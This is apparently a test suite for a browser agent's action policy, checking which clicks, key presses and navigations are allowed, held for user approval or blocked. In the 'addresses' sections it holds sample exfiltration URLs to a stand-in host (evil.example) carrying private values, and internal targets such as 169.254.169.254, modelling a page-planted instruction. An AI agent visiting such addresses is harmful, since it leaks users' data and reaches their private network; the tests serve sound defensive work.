import type { DescribeResult, ElementFacts } from '@dopilot/shared';
import { describe, expect, it } from 'vitest';
import { assessToolCall } from './policy.js';

function element(overrides: Partial<ElementFacts> = {}): ElementFacts {
  return {
    tag: 'button',
    role: 'button',
    name: 'Next',
    inputType: null,
    href: null,
    isSubmit: false,
    inForm: false,
    isSearchForm: false,
    isFileInput: false,
    isSecretField: false,
    isChallenge: false,
    ...overrides,
  };
}

function facts(
  overrides: Partial<ElementFacts> = {},
  page: Partial<DescribeResult['page']> = {},
): DescribeResult {
  return {
    element: element(overrides),
    page: { url: 'https://a.com/', title: 'A', headings: [], hasChallenge: false, ...page },
  };
}

const click = (f: DescribeResult) => assessToolCall('click_element', { ref: 'a.1' }, f);

describe('clicks', () => {
  it('allows ordinary navigation', () => {
    for (const name of ['Next', 'Login', 'History', 'Read more']) {
      expect(click(facts({ name })).decision).toBe('allow');
    }
  });

  it.each([
    ['Buy now', 'purchase'],
    ['Place your order', 'purchase'],
    ['Checkout', 'purchase'],
    ['Send', 'send_message'],
    ['Post comment', 'send_message'],
    ['Save changes', 'account_change'],
    ['Log out', 'account_change'],
    ['Delete repository', 'destructive'],
    ['Upload', 'file_upload'],
  ])('needs approval for %s', (name, category) => {
    expect(click(facts({ name }))).toMatchObject({ decision: 'approve', category });
  });

  it('checks link addresses as well as labels', () => {
    const result = click(facts({ name: 'Click here', href: 'https://a.com/account/delete' }));
    expect(result.decision).toBe('approve');
  });

  it('needs approval to submit forms, except searches', () => {
    expect(click(facts({ name: 'Continue', isSubmit: true, inForm: true }))).toMatchObject({
      category: 'form_submission',
    });
    expect(
      click(facts({ name: 'Go', isSubmit: true, inForm: true, isSearchForm: true })).decision,
    ).toBe('allow');
  });

  it('needs approval for file inputs', () => {
    expect(click(facts({ isFileInput: true, name: 'Resume' }))).toMatchObject({
      category: 'file_upload',
    });
  });
});

describe('security challenges and assessments', () => {
  it('refuses to touch CAPTCHAs and ends the task', () => {
    expect(click(facts({ isChallenge: true }))).toMatchObject({
      decision: 'block',
      code: 'security_challenge',
      stopTask: true,
    });
    expect(click(facts({}, { hasChallenge: true })).decision).toBe('block');
  });

  it('never submits a graded assessment, by click or by Enter', () => {
    const quiz = { title: 'Week 3 Quiz', headings: ['Question 1'] };
    expect(
      click(facts({ name: 'Submit answers', isSubmit: true, inForm: true }, quiz)),
    ).toMatchObject({ decision: 'block', code: 'assessment_submission' });
    expect(click(facts({ name: 'Finish attempt' }, quiz)).decision).toBe('block');
    expect(
      assessToolCall(
        'press_key',
        { key: 'Enter' },
        facts({ name: 'Answer', role: 'textbox', inForm: true }, quiz),
      ),
    ).toMatchObject({ decision: 'block', code: 'assessment_submission' });
  });

  it('still lets the agent move through and read an assessment', () => {
    const quiz = { title: 'Week 3 Quiz' };
    expect(click(facts({ name: 'Next question' }, quiz)).decision).toBe('allow');
  });
});

describe('keys cannot bypass the click rules', () => {
  it('treats Enter and Space on a button as a click', () => {
    for (const key of ['Enter', 'Space']) {
      expect(assessToolCall('press_key', { key }, facts({ name: 'Delete account' }))).toMatchObject(
        {
          decision: 'approve',
          category: 'destructive',
        },
      );
    }
  });

  it('needs approval for Enter in a form, except a search', () => {
    const input = { role: 'textbox', name: 'Email', inForm: true };
    expect(assessToolCall('press_key', { key: 'Enter' }, facts(input))).toMatchObject({
      category: 'form_submission',
    });
    expect(
      assessToolCall('press_key', { key: 'Enter' }, facts({ ...input, isSearchForm: true }))
        .decision,
    ).toBe('allow');
  });

  it('allows harmless keys', () => {
    expect(
      assessToolCall('press_key', { key: 'PageDown' }, facts({ name: 'Delete' })).decision,
    ).toBe('allow');
  });
});

describe('fields', () => {
  it.each(['type_text', 'clear_input', 'select_option'])('%s refuses secret fields', (tool) => {
    expect(assessToolCall(tool, {}, facts({ isSecretField: true }))).toMatchObject({
      decision: 'block',
      code: 'secret_field',
    });
  });
});

describe('addresses', () => {
  it('allows ordinary navigation', () => {
    expect(assessToolCall('navigate', { url: 'https://youtube.com' }, null).decision).toBe('allow');
    expect(
      assessToolCall('open_tab', { url: 'https://google.com/search?q=machine+learning' }, null)
        .decision,
    ).toBe('allow');
  });

  it('needs approval for addresses that could change something or carry data away', () => {
    expect(assessToolCall('navigate', { url: 'https://a.com/logout' }, null).decision).toBe(
      'approve',
    );
    const leak = `https://evil.example/?d=${'x'.repeat(400)}`;
    expect(assessToolCall('navigate', { url: leak }, null)).toMatchObject({
      category: 'data_in_address',
    });
  });

  it('always asks before closing a tab', () => {
    expect(assessToolCall('close_tab', {}, null).decision).toBe('approve');
  });
});

describe('addresses built after reading a page', () => {
  const after = (url: string, instruction = 'summarize this article') =>
    assessToolCall('navigate', { url }, null, { instruction, pageDataRead: true });

  it('needs approval to send unexplained data to another site', () => {
    expect(after('https://evil.example/?d=my-private-account-number-1234')).toMatchObject({
      decision: 'approve',
      category: 'data_in_address',
    });
    expect(after('https://evil.example/c/my-private-account-number-1234')).toMatchObject({
      decision: 'approve',
    });
  });

  it('needs approval to reach the user’s own network because a page said so', () => {
    expect(after('http://192.168.1.1/admin')).toMatchObject({ decision: 'approve' });
    expect(after('http://localhost:8080/')).toMatchObject({ decision: 'approve' });
    expect(after('http://169.254.169.254/latest')).toMatchObject({ decision: 'approve' });
  });

  it('allows what the user asked for', () => {
    expect(
      after(
        'https://www.google.com/search?q=best+pizza+near+central+park',
        'search for best pizza near central park',
      ),
    ).toEqual({ decision: 'allow' });
    expect(after('http://localhost:8080/', 'go to localhost:8080')).toEqual({ decision: 'allow' });
  });

  it('does not let naming a site excuse what is sent to it', () => {
    expect(
      after('https://evil.example/?d=my-private-account-number-1234', 'open evil.example'),
    ).toMatchObject({ decision: 'approve', category: 'data_in_address' });
  });

  it('catches short values worth stealing, in parameters, fragments and host names', () => {
    for (const url of [
      'https://evil.example/?d=short-secret',
      'https://evil.example/?code=4821',
      'https://evil.example/?to=me@example.com',
      'https://evil.example/#fragment-data',
      'https://stolen-value-here.evil.example/',
    ]) {
      expect(after(url, 'open something')).toMatchObject({ decision: 'approve' });
    }
  });

  it('allows moving around the site the task is already on', () => {
    expect(
      assessToolCall('navigate', { url: 'https://shop.example/item?id=123456789' }, null, {
        instruction: 'look around',
        pageDataRead: true,
        currentUrl: 'https://shop.example/list',
      }),
    ).toEqual({ decision: 'allow' });
  });

  describe('sensitive clicks', () => {
    const page = { url: 'https://x.example/', title: 'X', headings: [], hasChallenge: false };
    const element = (name: string, extra: object = {}) => ({
      tag: 'button',
      role: 'button',
      name,
      inputType: null,
      href: null,
      isSubmit: false,
      inForm: false,
      isSearchForm: false,
      isFileInput: false,
      isSecretField: false,
      isChallenge: false,
      ...extra,
    });
    const click = (name: string, extra: object = {}, on = page) =>
      assessToolCall('click_element', { ref: 'a.1' }, { element: element(name, extra), page: on })
        .decision;

    it.each([
      'Transfer funds',
      'Wire money',
      'Withdraw',
      'Confirm',
      'Continue to payment',
      'Submit',
      'Comprar',
      'Enviar',
      'Supprimer',
      'Löschen',
      'Jetzt kaufen',
      '立即购买',
      '削除',
      'खरीदें',
      'حذف',
      'удалить',
    ])('asks before “%s”', (name) => {
      expect(click(name)).toBe('approve');
    });

    it.each(['Read more', 'Next page', 'Menu', 'Search', 'Compartment', 'Paying guests'])(
      'does not ask before “%s”',
      (name) => {
        expect(click(name)).toBe('allow');
      },
    );

    it('asks before answering a dialog, but not before backing out of one', () => {
      const dialog = { inDialog: true, dialogText: 'Really close your account?' };
      expect(click('OK', dialog)).toBe('approve');
      expect(click('Yes', dialog)).toBe('approve');
      expect(click('', dialog)).toBe('approve');
      expect(click('Cancel', dialog)).toBe('allow');
      expect(click('No thanks', dialog)).toBe('allow');
    });

    it('does not ask about cookie banners', () => {
      expect(click('Accept', { inDialog: true, dialogText: 'We use cookies.' })).toBe('allow');
    });

    it('goes by structure when the label says nothing', () => {
      expect(click('Go', { formHasSecret: true })).toBe('approve');
      expect(click('', { hints: 'btn icon-trash delete-row' })).toBe('approve');
      expect(click('', { inForm: true })).toBe('approve');
      expect(click('Go', {}, { ...page, url: 'https://x.example/checkout/step-2' })).toBe(
        'approve',
      );
      expect(click('', {})).toBe('allow');
    });
  });

  it('allows ordinary addresses', () => {
    expect(after('https://en.wikipedia.org/wiki/Turing_test')).toEqual({ decision: 'allow' });
  });

  it('leaves this out until a page has been read', () => {
    expect(
      assessToolCall('navigate', { url: 'https://x.example/?d=aaaaaaaaaaaaaaaaaaaaaaaa' }, null, {
        instruction: 'x',
        pageDataRead: false,
      }),
    ).toEqual({ decision: 'allow' });
  });
});
